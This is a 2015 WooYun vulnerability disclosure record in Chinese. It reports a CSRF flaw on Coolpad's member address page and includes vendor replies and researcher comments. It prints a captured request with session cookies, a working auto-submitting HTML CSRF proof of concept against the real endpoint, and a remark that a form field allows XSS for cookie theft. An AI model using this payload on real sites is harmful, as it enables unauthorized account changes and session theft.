{"id": 34935, "wybug_id": "wooyun-2015-0105129", "wybug_title": "酷派某分站CSRF越权修改资料", "wybug_corp": "yulong.com", "wybug_author": "泳少", "wybug_date": "2015-04-02 14:43", "wybug_open_date": "2015-05-22 09:20", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向公众公开  简要描述： 酷派某分站CSRF越权修改资料 详细说明：  问题地址 http://www.coolpad.com/myec/myAddress.htm#\nPOST /member/memberAddressAction!saveAddreass.do HTTP/1.1Host: www.coolpad.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.coolpad.com/myec/myAddress.htmContent-Length: 222Cookie: pgv_pvi=839996416; pgv_si=s5988466688; CP_SW_U_Id=ed13a4ef-76e4-43ec-ad3d-71b870e61930_89wff3; W_CP_T_Id=dt9_894590b560-fe19-4581-ac7f-eb5019fa3613s1sr; Hm_lvt_ed4dc0af212843677141159d85428e45=1427696677; Hm_lpvt_ed4dc0af212843677141159d85428e45=1427698264; isMobile=n; _adwb=186884782; _adwc=186884782; _adwp=186884782.1073015111.1427696676.1427696676.1427696676.1; _adwr=186884782%23http%253A%252F%252Fhealth.coolyun.com%252F; __ozlvd1844=1427698263; U_T=null; rememberUserNickName=29311707; isHasLogin=true; shopCart=\"\"; glanceOverGoods=\"\"; nTalk_CACHE_DATA={uid:kf_9926_ISME9754_guest4905ED02-9D49-04,tid:1427696679035713}; NTKF_T2D_CLIENTID=guest4905ED02-9D49-04E8-4B60-695A79CF5440; JSESSIONID=89E1BAF3241C39C3D077D8797006D3FB; _jzqa=1.4072024361483798000.1427696684.1427696684.1427696684.1; _jzqb=1.25.10.1427696684.1; _jzqc=1; _jzqx=1.1427696684.1427696684.1.jzqsr=coolpad%2Ecom|jzqct=/.-; _jzqckmp=1; _qzja=1.1064359118.1427696684524.1427696684524.1427696684525.1427698509524.1427698627783.0.0.0.25.1; _qzjb=1.1427696684524.25.0.0.0; _qzjc=1; _qzjto=25.1.0; Hm_lvt_cf573ba5889953becfec5b2e08d9160d=1427696685; Hm_lpvt_cf573ba5889953becfec5b2e08d9160d=1427698628Connection: keep-alivePragma: no-cacheCache-Control: no-cacheaddressId=&receiver=test&province=260&city=252&district=3070&address=test&mobilePhone=13416364102&telPhone=&email=&postCode=&fullAddress=%E5%B9%BF%E4%B8%9C%E7%9C%81%E4%BD%9B%E5%B1%B1%E5%B8%82%E9%AB%98%E6%98%8E%E5%8C%BAtest\n抓到的包可见木有token限制。直接构造POC吧\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><html><head><title>test</title></head><body onload=\"javascript:fireForms()\"><script language=\"JavaScript\">var pauses = new Array( \"172\" );function pausecomp(millis){    var date = new Date();    var curDate = null;    do { curDate = new Date(); }    while(curDate-date < millis);}function fireForms(){    var count = 1;    var i=0;        for(i=0; i<count; i++)    {        document.forms[i].submit();                pausecomp(pauses[i]);    }}    </script><H2>test</H2><form method=\"POST\" name=\"form0\" action=\"http://www.coolpad.com:80/member/memberAddressAction!saveAddreass.do\"><input type=\"hidden\" name=\"addressId\" value=\"\"/><input type=\"hidden\" name=\"receiver\" value=\"test\"/><input type=\"hidden\" name=\"province\" value=\"856\"/><input type=\"hidden\" name=\"city\" value=\"860\"/><input type=\"hidden\" name=\"district\" value=\"862\"/><input type=\"hidden\" name=\"address\" value=\"test\"/><input type=\"hidden\" name=\"mobilePhone\" value=\"13416364102\"/><input type=\"hidden\" name=\"telPhone\" value=\"\"/><input type=\"hidden\" name=\"email\" value=\"\"/><input type=\"hidden\" name=\"postCode\" value=\"\"/><input type=\"hidden\" name=\"fullAddress\" value=\"重庆重庆市北碚区test\"/></form></body></html>\n另外说明个问题<input type=\"hidden\" name=\"fullAddress\" value=\"重庆重庆市北碚区test\"/> 这个表单是可以控制的还可以输入XSS代码，弹窗盗cookie不成问题~   漏洞证明：  \n\n   修复方案：  加强token验证。   版权声明：转载请注明来源 泳少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-04-07 09:19 厂商回复： 感谢你关注酷派安全，问题已转给业务方处理，十分感谢。 最新状态： 2015-04-08：已增加登录验证，另外，在没登录的情况下，此伪造的数据不可见或当前用户可见，XSS应该难以利用。@泳少，CSRF的有什么好方法，你说的token是指登录吗？  ", "replys": "漏洞评价：\n评论\n     2015-04-02 15:05 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  CSRF、越权，到底是啥，小厂商了    \n     2015-04-02 15:21 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  来啦    \n     2015-04-02 15:56 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @px1624 擦。。又是小厂、算了。下次用小号发漏洞    \n     2015-04-03 23:41 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @浩天 麻烦把漏洞信息更细下可以吗？    \n     2015-04-08 13:54 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @yulong.com 恩。对的登陆了账号加上token限制、然后修改资料弄下验证码上去也可以的哈~    \n     2015-05-08 09:32 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  这应该只是csrf吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}